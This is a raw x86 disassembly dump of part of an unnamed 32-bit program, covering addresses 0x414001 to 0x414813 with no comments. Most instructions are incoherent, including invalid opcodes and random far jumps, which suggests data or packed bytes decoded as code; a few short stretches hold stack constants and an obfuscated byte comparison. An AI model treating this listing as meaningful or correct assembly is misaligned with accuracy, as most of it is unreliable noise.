  414001:	sbb    DWORD PTR [edi],esp
  414003:	js     0x413fc1
  414005:	jmp    0x41404e
  414007:	push   ss
  414008:	arpl   cx,ax
  41400a:	lds    edx,FWORD PTR [ebx+eiz*2-0x1]
  41400e:	jne    0x414025
  414010:	fcomp  QWORD PTR [edi-0x2356caf3]
  414017:	jge    0x414020
  414019:	je     0x414029
  41401b:	push   ebp
  41401c:	push   edi
  41401d:	jno    0x413fdf
  41401f:	cmp    ebp,DWORD PTR [edi+0x207a14cc]
  414025:	lds    edi,FWORD PTR [edx+0x22fa4b25]
  41402b:	and    BYTE PTR [ecx+ecx*2-0x3c30341b],dl
  414032:	adc    eax,0x33fdc5d8
  414037:	pop    ebx
  414038:	xchg   edx,eax
  414039:	mov    esi,0x905730db
  41403e:	addr16 xchg ebp,eax
  414040:	fisub  DWORD PTR [ebx+0x1b]
  414043:	dec    edx
  414044:	popa   
  414045:	into   
  414046:	repnz inc eax
  414048:	add    dh,BYTE PTR [edx+0x6d7f1325]
  41404e:	fwait
  41404f:	cmp    al,0x3e
  414051:	(bad)  
  414052:	jmp    0x5d3ad7fd
  414057:	xlat   BYTE PTR fs:[ebx]
  414059:	adc    al,0x15
  41405b:	adc    DWORD PTR [ebx],ebp
  41405d:	mov    gs,WORD PTR [edi+0x9cfae02]
  414063:	jle    0x414095
  414065:	cmp    ebp,edx
  414067:	or     al,0xda
  414069:	dec    esp
  41406a:	sub    dl,ah
  41406c:	pusha  
  41406d:	in     eax,0x46
  41406f:	pop    esp
  414070:	xor    cl,al
  414072:	mov    ebp,0xbb2d41d
  414077:	or     DWORD PTR [ecx-0x8],ecx
  41407a:	popa   
  41407b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41407c:	aas    
  41407d:	mov    ds:0xb134ca35,eax
  414082:	pop    ebx
  414083:	mov    ebx,0xa7fe183e
  414088:	sub    edi,DWORD PTR [ebp-0x517eda39]
  41408e:	mov    dh,0xee
  414090:	add    eax,0x84d1310a
  414095:	arpl   WORD PTR [ecx-0x42e8fb30],sp
  41409b:	jo     0x4140e5
  41409d:	aam    0x48
  41409f:	pop    esp
  4140a0:	popf   
  4140a1:	shr    BYTE PTR [edi+0x6b],cl
  4140a4:	mov    ah,0x8b
  4140a6:	les    esp,FWORD PTR [ebp-0x6e]
  4140a9:	push   ds
  4140aa:	adc    bl,BYTE PTR [esi]
  4140ac:	enter  0xd6d9,0xa3
  4140b0:	or     eax,DWORD PTR [ecx-0x160ba6b9]
  4140b6:	pop    ebx
  4140b7:	ret    0x748e
  4140ba:	out    dx,al
  4140bb:	xor    esp,esp
  4140bd:	sub    DWORD PTR [ecx+edx*1-0xf],ebx
  4140c1:	test   edi,edx
  4140c3:	int3   
  4140c4:	bound  edx,QWORD PTR [edi-0x77]
  4140c7:	jne    0x41408d
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x42202c
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ebx+edx*2+0x74]
  414159:	mov    cl,0xb0
  41415b:	sbb    ch,BYTE PTR [eax+ebx*1]
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    cl,bl
  414164:	push   0x6e
  414166:	xor    DWORD PTR [edi],edx
  414168:	jae    0x4141a2
  41416a:	jo     0x414102
  41416c:	push   es
  41416d:	inc    ecx
  41416e:	add    eax,0xc574a3f7
  414173:	adc    ah,dh
  414175:	fistp  DWORD PTR [ecx]
  414177:	add    ebx,DWORD PTR [eax+ebx*4]
  41417a:	sub    BYTE PTR [si-0x20c7],0xf3
  414180:	xchg   edi,eax
  414181:	test   eax,0x4b48a5f7
  414186:	mov    DWORD PTR [ecx+ebp*1+0x27],esp
  41418a:	mov    BYTE PTR [eax],bl
  41418c:	adc    al,BYTE PTR ss:[eax+0x30]
  414190:	retf   
  414191:	sub    ah,BYTE PTR [edx]
  414193:	out    dx,al
  414194:	imul   ebp,DWORD PTR [edi+0x3e],0x32
  414198:	mov    al,ds:0xa21217e7
  41419d:	in     al,0xe6
  41419f:	jbe    0x41418f
  4141a1:	jno    0x41414c
  4141a3:	lods   al,BYTE PTR ds:[esi]
  4141a4:	add    BYTE PTR [ebx+0x5121ba67],ah
  4141aa:	jge    0x414213
  4141ac:	lods   eax,DWORD PTR ds:[esi]
  4141ad:	popf   
  4141ae:	fwait
  4141af:	out    dx,al
  4141b0:	outs   dx,BYTE PTR ds:[esi]
  4141b1:	xchg   esp,eax
  4141b2:	dec    esi
  4141b3:	xor    al,0x6b
  4141b5:	arpl   WORD PTR [edi-0x3b69e2e6],dx
  4141bb:	jne    0x41418f
  4141bd:	xchg   esp,eax
  4141be:	push   0xffffffea
  4141c0:	ss pop ecx
  4141c2:	popf   
  4141c3:	jl     0x4141f9
  4141c5:	or     ebx,DWORD PTR ds:0x3c2784dd
  4141cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141cc:	mov    bh,0x20
  4141ce:	push   es
  4141cf:	jnp    0x4141b6
  4141d1:	or     eax,0x24393391
  4141d6:	addr16 (bad) 
  4141d8:	mov    eax,ds:0x13e555c3
  4141dd:	mov    ch,0x61
  4141df:	xchg   esp,eax
  4141e0:	rcl    BYTE PTR [eax],0x30
  4141e3:	call   0x16c4d0db
  4141e8:	cld    
  4141e9:	retf   
  4141ea:	stos   DWORD PTR es:[edi],eax
  4141eb:	and    DWORD PTR [ecx+0x43f7568d],eax
  4141f1:	mov    ebx,0x62510851
  4141f6:	inc    edx
  4141f7:	jmp    0x414278
  4141f9:	bnd jae 0x4141dc
  4141fc:	xchg   DWORD PTR [ebp-0x18],edi
  4141ff:	daa    
  414200:	jge    0x4141ac
  414202:	mov    dh,0x7d
  414204:	sub    ch,ah
  414206:	xor    BYTE PTR [ebx+0x21],dl
  414209:	and    DWORD PTR [eax+0x9],ecx
  41420c:	icebp  
  41420d:	fdiv   DWORD PTR [esi]
  41420f:	mov    dl,0x79
  414211:	mov    ebx,0xc3b79ad6
  414216:	inc    ebp
  414217:	retf   
  414218:	mov    ecx,DWORD PTR [esi+0x32]
  41421b:	(bad)  
  41421c:	cmp    bl,bl
  41421e:	pop    ds
  41421f:	cmp    DWORD PTR [edx-0x1b],ebp
  414222:	in     al,0xe7
  414224:	(bad)
  414227:	lock xchg ecx,eax
  414229:	xor    eax,0x1a9c39ce
  41422e:	mov    ss,WORD PTR [ecx+ebx*8-0x4b]
  414232:	mov    ecx,0x55231e11
  414237:	xchg   ecx,eax
  414238:	inc    eax
  414239:	enter  0x5f2e,0x3f
  41423d:	aam    0x29
  41423f:	mov    al,ah
  414241:	test   eax,0xdccefdc
  414246:	neg    DWORD PTR [ecx-0x5b]
  414249:	lea    esi,[eax+0xf]
  41424c:	cs jns 0x4141e5
  41424f:	adc    DWORD PTR ds:0x2908eb15,eax
  414255:	lock inc esp
  414257:	xchg   esi,eax
  414258:	not    ecx
  41425a:	std    
  41425b:	mov    ecx,0x927c4f95
  414260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414261:	cmp    cl,bh
  414263:	push   ebp
  414264:	sbb    eax,DWORD PTR [ecx]
  414266:	sub    al,0xac
  414268:	xor    al,0xf5
  41426a:	popf   
  41426b:	xchg   ebp,eax
  41426c:	push   edi
  41426d:	push   esp
  41426e:	or     dh,al
  414270:	inc    eax
  414271:	cmc    
  414272:	fs (bad) 
  414274:	fcomip st,st(6)
  414276:	pushf  
  414277:	or     eax,0x1ebbd17c
  41427c:	nop
  41427d:	out    0x48,al
  41427f:	fyl2xp1 
  414281:	dec    eax
  414282:	inc    esp
  414283:	cmp    eax,0xb63d8f07
  414288:	add    al,0xe5
  41428a:	push   DWORD PTR [esi]
  41428c:	aad    0x72
  41428e:	xlat   BYTE PTR ds:[ebx]
  41428f:	mov    esi,0x82bb706e
  414294:	iret   
  414295:	call   0x1481:0x1b63edd1
  41429c:	adc    esp,DWORD PTR [esi+0x4d48f8c]
  4142a2:	add    BYTE PTR [ecx+0x268e00c3],bh
  4142a8:	xchg   ebp,eax
  4142a9:	sub    DWORD PTR [ebp-0x525b32a7],ebx
  4142af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142b0:	adc    edx,edx
  4142b2:	mov    dh,0x31
  4142b4:	arpl   WORD PTR [eax-0x5a],di
  4142b7:	add    eax,0xb04095c9
  4142bc:	add    BYTE PTR ds:0x4523c22,al
  4142c2:	fist   WORD PTR [ecx+0x42]
  4142c5:	pop    ebp
  4142c6:	idiv   esp
  4142c8:	(bad)
  4142cb:	xchg   edx,eax
  4142cc:	rol    DWORD PTR [esi+0x1d],0x1c
  4142d0:	jnp    0x41431c
  4142d2:	dec    ebp
  4142d3:	icebp  
  4142d4:	ds inc edi
  4142d6:	push   ebx
  4142d7:	ror    ah,1
  4142d9:	call   0x93ee83f3
  4142de:	enter  0x7f74,0x4e
  4142e2:	pop    esi
  4142e3:	add    al,0x9d
  4142e5:	and    esp,DWORD PTR [ecx+edx*4]
  4142e8:	inc    BYTE PTR [edi-0x32]
  4142eb:	mov    esp,0xc6822ba2
  4142f0:	lock sahf 
  4142f2:	sub    dh,BYTE PTR [eax+edx*8]
  4142f5:	rcl    DWORD PTR [ebx+0x35aa1a36],1
  4142fb:	fisub  DWORD PTR [esi-0x25691552]
  414301:	adc    DWORD PTR [ecx-0x2],esi
  414304:	push   ebp
  414305:	fst    QWORD PTR [ecx]
  414307:	(bad)  
  414308:	shr    DWORD PTR [edx+esi*2+0x4b97774f],cl
  41430f:	pusha  
  414310:	outs   dx,DWORD PTR ds:[esi]
  414311:	out    0xe2,al
  414313:	mov    bh,0xe3
  414315:	sub    BYTE PTR [esi-0x6e5fab],0xa5
  41431c:	sahf   
  41431d:	push   eax
  41431e:	sbb    eax,0xdf74a580
  414323:	jmp    0x4143a3
  414325:	enter  0x1d79,0xa4
  414329:	mov    bl,0x31
  41432b:	sahf   
  41432c:	mov    WORD PTR [esi],ss
  41432e:	sar    DWORD PTR [esi],0x79
  414331:	sbb    al,0xb4
  414333:	pop    ebp
  414334:	fsubr  st(5),st
  414336:	xor    al,0xf9
  414338:	iret   
  414339:	into   
  41433a:	test   eax,0x8123c5ed
  41433f:	and    ebp,edi
  414341:	fist   DWORD PTR [ecx-0x3a157cf]
  414347:	mov    esi,0x51047035
  41434c:	inc    edi
  41434d:	sete   BYTE PTR ds:0x96c81441
  414354:	(bad)  
  414355:	fisubr WORD PTR [ebp-0x6ddfd8ed]
  41435b:	xchg   ebx,eax
  41435c:	sub    esi,ebx
  41435e:	lods   eax,DWORD PTR ds:[esi]
  41435f:	ds push cs
  414361:	cmp    cl,0x46
  414364:	mov    esp,0xcfd849e5
  414369:	dec    edx
  41436a:	inc    ebp
  41436b:	dec    ecx
  41436c:	cwde   
  41436d:	iret   
  41436e:	inc    esp
  41436f:	pop    es
  414370:	clc    
  414371:	ficom  DWORD PTR [ecx-0x46e602e0]
  414377:	push   esp
  414378:	jg     0x4143d7
  41437a:	fsub   QWORD PTR [edi-0x5e5e0d39]
  414380:	je     0x414389
  414382:	jb     0x414362
  414384:	xor    BYTE PTR [ebp+edx*1+0x505b640a],dl
  41438b:	mov    edi,0x2973fbfb
  414390:	xchg   esi,eax
  414391:	adc    eax,0x5b5018f9
  414396:	xchg   edx,eax
  414397:	sbb    al,0xbe
  414399:	or     ebp,DWORD PTR [ebx-0x5e9a0187]
  41439f:	xchg   edi,eax
  4143a0:	cs inc ecx
  4143a2:	(bad)  
  4143a3:	xchg   edx,eax
  4143a4:	inc    edx
  4143a5:	xor    dl,dl
  4143a7:	(bad)  
  4143a8:	inc    edx
  4143a9:	out    0x15,al
  4143ab:	adc    eax,0xbee2bfee
  4143b0:	inc    esp
  4143b1:	aam    0x27
  4143b3:	jnp    0x4143da
  4143b5:	xchg   esp,eax
  4143b6:	shl    DWORD PTR [eax*4-0xfa4b568],0x16
  4143be:	retf   0xe163
  4143c1:	add    eax,0x3d4ba163
  4143c6:	mov    DWORD PTR [ebx],0xfa0f1bb7
  4143cc:	pop    esp
  4143cd:	loop   0x41435b
  4143cf:	(bad)  
  4143d0:	les    edi,FWORD PTR [edx+edx*2+0x196003e9]
  4143d7:	push   ss
  4143d8:	adc    al,0xfb
  4143da:	dec    esi
  4143db:	push   esp
  4143dc:	out    dx,eax
  4143dd:	jl     0x4143cf
  4143df:	fcomp  DWORD PTR [ecx]
  4143e1:	or     ch,ah
  4143e3:	mov    cl,0x5a
  4143e5:	cmp    cl,BYTE PTR [edi+ebx*2+0x3]
  4143e9:	xchg   DWORD PTR [edi-0xc],ebp
  4143ec:	imul   eax,DWORD PTR [ecx],0x68f8c72b
  4143f2:	push   ss
  4143f3:	clc    
  4143f4:	and    ah,dl
  4143f6:	repz sets BYTE PTR [esi+0x58]
  4143fb:	int    0xa8
  4143fd:	sbb    BYTE PTR [ebp+0x13],dh
  414400:	mov    ecx,0x9aebd531
  414405:	xchg   ecx,eax
  414406:	cmp    esp,DWORD PTR [eax]
  414408:	push   ds
  414409:	jo     0x414449
  41440b:	popa   
  41440c:	xor    bl,BYTE PTR [esi+0x301bc196]
  414412:	ret    
  414413:	push   es
  414414:	out    dx,al
  414415:	jb     0x41446b
  414417:	jns    0x414412
  414419:	out    dx,al
  41441a:	push   es
  41441b:	mov    al,ds:0xa8a65f8
  414420:	fstp   DWORD PTR [esi-0x27bc557e]
  414426:	out    0x2c,al
  414428:	jns    0x4143d6
  41442a:	push   cs
  41442b:	or     ecx,ecx
  41442d:	jp     0x414438
  41442f:	mov    al,ds:0x1e56c09e
  414434:	xchg   edx,eax
  414435:	xchg   ebp,eax
  414436:	jno    0x414498
  414438:	dec    al
  41443a:	mov    bl,0xd1
  41443c:	test   DWORD PTR [eax-0x3e44f385],ebp
  414442:	sbb    eax,0x24563c24
  414447:	fwait
  414448:	or     bl,BYTE PTR [ecx-0x17]
  41444b:	(bad)  
  41444c:	into   
  41444d:	sub    al,0x5
  41444f:	js     0x41446f
  414451:	push   ss
  414452:	push   edx
  414453:	rol    DWORD PTR [ebx-0x64f06c16],0xf3
  41445a:	fisttp QWORD PTR [ecx+edi*2+0x430df2e3]
  414461:	push   ss
  414462:	push   ebx
  414463:	add    ebp,DWORD PTR [ecx-0x72]
  414466:	cmp    al,0x14
  414468:	data16 fstp TBYTE PTR [ecx+edx*1-0x1e8fa537]
  414470:	jbe    0x4144a1
  414472:	nop
  414473:	and    ecx,DWORD PTR ds:0x221ffa05
  414479:	int3   
  41447a:	enter  0xd3fa,0x92
  41447e:	cmc    
  41447f:	pop    edi
  414480:	sbb    BYTE PTR [ebx-0x42a9b128],bl
  414486:	cmp    DWORD PTR [eax+ebx*8],ebx
  414489:	sti    
  41448a:	xor    esi,DWORD PTR [edi]
  41448c:	or     DWORD PTR [eax],ebx
  41448e:	pop    edx
  41448f:	mov    esp,0x66b28244
  414494:	dec    ecx
  414495:	push   edi
  414496:	dec    ebp
  414497:	pop    ebx
  414498:	and    eax,0x665d0b7e
  41449d:	adc    dh,dl
  41449f:	sub    BYTE PTR [esi-0x4e0fa03c],dl
  4144a5:	mov    ah,0x21
  4144a7:	inc    esi
  4144a8:	gs dec eax
  4144aa:	pop    esi
  4144ab:	mov    al,0xf2
  4144ad:	(bad)  
  4144af:	sub    esi,DWORD PTR [esi+ecx*8-0x3d]
  4144b3:	mov    bh,0x1d
  4144b5:	jg     0x414510
  4144b7:	cmp    edi,ecx
  4144b9:	sbb    bl,al
  4144bb:	push   ecx
  4144bc:	mov    al,0xc8
  4144be:	pusha  
  4144bf:	inc    eax
  4144c0:	rcr    BYTE PTR [bp+si],0xe9
  4144c4:	retf   0xfcad
  4144c7:	fild   WORD PTR [edx+edx*1]
  4144ca:	out    dx,al
  4144cb:	stc    
  4144cc:	sub    eax,0xcd3d2e6e
  4144d1:	mov    al,0xa
  4144d3:	clc    
  4144d4:	mov    cl,0x30
  4144d6:	mov    bl,0xfc
  4144d8:	mov    ecx,0x7a907953
  4144dd:	push   esp
  4144de:	scas   eax,DWORD PTR es:[edi]
  4144df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144e0:	in     al,dx
  4144e1:	shr    edi,cl
  4144e3:	in     eax,0x94
  4144e5:	js     0x4144df
  4144e7:	les    esi,FWORD PTR [ebp-0x7ec2adf4]
  4144ed:	mov    dh,0x50
  4144ef:	in     al,0xb8
  4144f1:	push   edi
  4144f2:	and    DWORD PTR [ebx+0x20a0b2f],esi
  4144f8:	xchg   ebx,eax
  4144f9:	retf   
  4144fa:	ss pop es
  4144fc:	pop    esp
  4144fd:	data16 ja 0x414537
  414500:	jecxz  0x414511
  414502:	pop    ds
  414503:	cmp    eax,0xe365f8ca
  414508:	mov    esi,0x45c73058
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x3e7c:0x73623c4c
  414595:	xchg   BYTE PTR [edi+0x1824d2b0],bh
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    cl,ch
  4145a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a2:	mov    dh,0x31
  4145a4:	pop    esp
  4145a5:	push   0xffffffb4
  4145a7:	cmp    DWORD PTR [edx-0x60],0xfffffff1
  4145ab:	mov    cl,0x56
  4145ad:	pop    eax
  4145ae:	retf   0xd404
  4145b1:	js     0x41454a
  4145b3:	xor    al,0x61
  4145b5:	fldenv ds:0x2c7c0f88
  4145bb:	push   cs
  4145bc:	jo     0x41460b
  4145be:	jno    0x414629
  4145c0:	and    ch,ah
  4145c2:	push   edi
  4145c3:	or     eax,0xcd20a955
  4145c8:	mov    ds:0x78857e43,al
  4145cd:	hlt    
  4145ce:	jg     0x4145f2
  4145d0:	or     eax,0xf51fc461
  4145d5:	retf   
  4145d6:	test   bh,ch
  4145d8:	les    ecx,FWORD PTR [ecx+0x25]
  4145db:	(bad)  
  4145dc:	ja     0x4145e3
  4145de:	in     al,dx
  4145df:	or     esp,DWORD PTR [eax-0x354ed075]
  4145e5:	stc    
  4145e6:	sbb    al,0x64
  4145e8:	hlt    
  4145e9:	ja     0x4145ce
  4145eb:	lds    ebx,FWORD PTR [eax-0x5a]
  4145ee:	pop    esp
  4145ef:	ja     0x41466c
  4145f1:	loope  0x414574
  4145f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145f4:	jnp    0x414578
  4145f6:	ficom  WORD PTR [esi+0x5]
  4145f9:	jp     0x414605
  4145fb:	(bad)  
  4145fc:	or     DWORD PTR [esi-0x47fe2a86],0xffffffa6
  414603:	and    BYTE PTR [ecx],dl
  414605:	cmp    ecx,DWORD PTR [ebx+eiz*2-0x7ca832fa]
  41460c:	xor    ebp,ebx
  41460e:	retf   
  41460f:	mov    esp,0x381267c5
  414614:	push   edx
  414615:	jmp    0xf6ecbb70
  41461a:	cmp    eax,edx
  41461c:	xor    eax,0x90e398ad
  414621:	scas   eax,DWORD PTR es:[edi]
  414622:	mov    eax,0x215f660b
  414627:	or     ebp,eax
  414629:	rcr    BYTE PTR [ebp+0x2d],cl
  41462c:	lods   al,BYTE PTR ds:[esi]
  41462d:	jae    0x4145f4
  41462f:	adc    ebp,ebx
  414631:	not    DWORD PTR [esi-0x1f50e448]
  414637:	shl    DWORD PTR [ecx-0x79],cl
  41463a:	std    
  41463b:	cmc    
  41463c:	jno    0x414602
  41463e:	ror    BYTE PTR ds:0x84e2ce67,cl
  414644:	les    edi,FWORD PTR [ecx+0x1]
  414647:	cmp    dl,BYTE PTR [ebx+0x70]
  41464a:	add    al,0x43
  41464c:	addr16 or esp,edi
  41464f:	sub    bl,BYTE PTR [eax-0x51f1eb2]
  414655:	or     al,0xbe
  414657:	mov    edx,0xd601bcfd
  41465c:	sbb    DWORD PTR [ecx-0x3785728a],0xdd373f5f
  414666:	and    DWORD PTR [esi],esi
  414668:	adc    ch,dh
  41466a:	mov    WORD PTR [esi-0x4b],es
  41466d:	push   esp
  41466e:	aaa    
  41466f:	imul   BYTE PTR [ecx]
  414671:	retf   
  414672:	jmp    0xef266115
  414677:	adc    esp,DWORD PTR [eax]
  414679:	or     eax,0xd0aa0f20
  41467e:	or     edi,ecx
  414680:	inc    esi
  414681:	inc    ebx
  414682:	push   ss
  414683:	ins    BYTE PTR es:[edi],dx
  414684:	inc    esi
  414685:	and    al,0xef
  414687:	xor    ch,BYTE PTR ds:0x3a75214e
  41468d:	push   edx
  41468e:	inc    edx
  41468f:	pusha  
  414690:	jle    0x41465e
  414692:	(bad)
  414695:	add    BYTE PTR [edx+0x21e29cc7],ch
  41469b:	clc    
  41469c:	js     0x4146f3
  41469e:	mov    ds,WORD PTR [ebp+esi*8-0x33c45d79]
  4146a5:	xchg   edi,eax
  4146a6:	ret    
  4146a7:	jg     0x4146d2
  4146a9:	push   DWORD PTR [edi-0x7f334566]
  4146af:	imul   ebx,DWORD PTR [eax+0x74],0xffffff84
  4146b3:	xor    DWORD PTR [edx-0x15],ebp
  4146b6:	and    DWORD PTR [ecx],0xffffffc8
  4146b9:	arpl   WORD PTR [edx-0x566dc91],bx
  4146bf:	push   0x28a3474d
  4146c4:	sar    ebx,1
  4146c6:	add    eax,0x1ddfe03b
  4146cb:	or     ebx,esp
  4146cd:	mov    bl,0xa1
  4146cf:	lock clc 
  4146d1:	cmp    al,0xf0
  4146d3:	push   esp
  4146d4:	cli    
  4146d5:	mov    BYTE PTR [edi-0x4a8017a5],al
  4146db:	call   0x17a4:0x348ec321
  4146e2:	js     0x414727
  4146e4:	loope  0x414679
  4146e6:	popa   
  4146e7:	or     dh,BYTE PTR fs:[esi+0xf8bcaa7]
  4146ee:	sbb    esp,DWORD PTR [ecx-0x27]
  4146f1:	adc    eax,0x7bfe85ba
  4146f6:	(bad)  
  4146f7:	mov    esp,DWORD PTR [esp+eax*2-0x2132fdaa]
  4146fe:	sub    eax,DWORD PTR [eax-0x57]
  414701:	in     eax,dx
  414702:	adc    al,0x1e
  414704:	push   ds
  414705:	dec    ecx
  414706:	xor    ah,BYTE PTR [eax+0x5]
  414709:	pop    ds
  41470a:	add    al,0x6c
  41470c:	cdq    
  41470d:	popf   
  41470e:	ds fwait
  414710:	stos   DWORD PTR es:[edi],eax
  414711:	pop    esi
  414712:	rcr    BYTE PTR [edi-0x6e],1
  414715:	shl    DWORD PTR [esi-0x3],cl
  414718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414719:	lods   eax,DWORD PTR ds:[esi]
  41471a:	int3   
  41471b:	pushf  
  41471c:	stos   BYTE PTR es:[edi],al
  41471d:	sti    
  41471e:	cld    
  41471f:	test   BYTE PTR [ebx],bh
  414721:	(bad)  
  414722:	mov    ebp,0x970675
  414727:	inc    ecx
  414728:	xor    ebx,DWORD PTR [ebp-0x38]
  41472b:	mov    eax,ds:0xd4ab3c59
  414730:	sbb    eax,0xc5560093
  414735:	mov    esp,DWORD PTR [ebx+0x76]
  414738:	ret    
  414739:	dec    esi
  41473a:	sbb    edx,ebp
  41473c:	inc    edx
  41473d:	lods   eax,DWORD PTR ds:[esi]
  41473e:	scas   eax,DWORD PTR es:[edi]
  41473f:	in     eax,0x38
  414741:	jo     0x414729
  414743:	pop    ecx
  414744:	shr    BYTE PTR [edx+0xda0f3bf],1
  41474a:	pop    ebx
  41474b:	loopne 0x41476b
  41474d:	retf   0x21ef
  414750:	hlt    
  414751:	ret    0x67e7
  414754:	mov    al,ds:0x50790cee
  414759:	sub    eax,0xf1a84885
  41475e:	mov    ch,0x70
  414760:	test   DWORD PTR [eax-0x67],edx
  414763:	les    esp,FWORD PTR [ecx-0x1f0dfd5f]
  414769:	add    edx,ecx
  41476b:	(bad)  
  41476c:	pop    ebx
  41476d:	dec    ecx
  41476e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41476f:	dec    ecx
  414770:	adc    eax,0x89707e55
  414775:	leave  
  414776:	mov    ecx,0x7427ae42
  41477b:	hlt    
  41477c:	xchg   DWORD PTR [esi+edx*4],esi
  41477f:	(bad)  
  414781:	jne    0x41479b
  414783:	outs   dx,DWORD PTR ds:[esi]
  414784:	in     eax,dx
  414785:	ss or  di,cx
  414789:	xchg   BYTE PTR [eax],bh
  41478b:	(bad)  [ebp-0x69]
  41478e:	xor    DWORD PTR [esi+eax*2],ecx
  414791:	enter  0xeeb5,0xa7
  414795:	aad    0xfe
  414797:	(bad)  
  414799:	dec    ecx
  41479a:	popf   
  41479b:	add    bh,ah
  41479d:	jno    0x414781
  41479f:	mov    ecx,0x26792754
  4147a4:	pushf  
  4147a5:	sub    al,0x36
  4147a7:	xchg   ecx,eax
  4147a8:	les    ebp,FWORD PTR [edi]
  4147aa:	and    cl,dh
  4147ac:	popa   
  4147ad:	sub    ebx,esi
  4147af:	outs   dx,DWORD PTR ds:[esi]
  4147b0:	push   ebp
  4147b1:	mov    dh,0x51
  4147b3:	jne    0x414816
  4147b5:	ret    0xa76d
  4147b8:	push   es
  4147b9:	sub    DWORD PTR [eax-0x6],ecx
  4147bc:	fwait
  4147bd:	xor    al,BYTE PTR [edx]
  4147bf:	scas   al,BYTE PTR es:[edi]
  4147c0:	outs   dx,BYTE PTR ds:[esi]
  4147c1:	cmp    al,0xbb
  4147c3:	dec    bx
  4147c5:	push   ebp
  4147c6:	es push 0x1d1b960d
  4147cc:	iret   
  4147cd:	or     cl,ch
  4147cf:	jge    0x414768
  4147d1:	in     al,dx
  4147d2:	push   ebp
  4147d3:	nop
  4147d4:	clc    
  4147d5:	inc    eax
  4147d6:	add    cl,BYTE PTR [edi+0x10]
  4147d9:	cld    
  4147da:	or     DWORD PTR [ecx],edx
  4147dc:	rol    eax,1
  4147de:	ins    DWORD PTR es:[edi],dx
  4147df:	out    dx,eax
  4147e0:	int    0x20
  4147e2:	add    ecx,ebx
  4147e4:	ror    BYTE PTR [ecx],0x4e
  4147e7:	popf   
  4147e8:	adc    BYTE PTR [ebp+0x1],ch
  4147eb:	je     0x41482b
  4147ed:	inc    edx
  4147ee:	repz call 0x42c3d9cc
  4147f4:	mov    al,0x3d
  4147f6:	mov    esp,0x87a80fc
  4147fb:	(bad)  
  4147fc:	dec    edx
  4147fd:	gs adc al,0x1f
  414800:	shl    DWORD PTR [ecx-0x61],0x94
  414804:	retf   
  414805:	addr16 mov esp,ebx
  414808:	pushf  
  414809:	sti    
  41480a:	(bad)  
  41480b:	arpl   WORD PTR es:[eax],di
  41480e:	lahf   
  41480f:	scas   eax,DWORD PTR es:[edi]
  414810:	popa   
  414811:	jo     0x4147cd
  414813:	lods   eax,DWORD PTR ds:[esi]
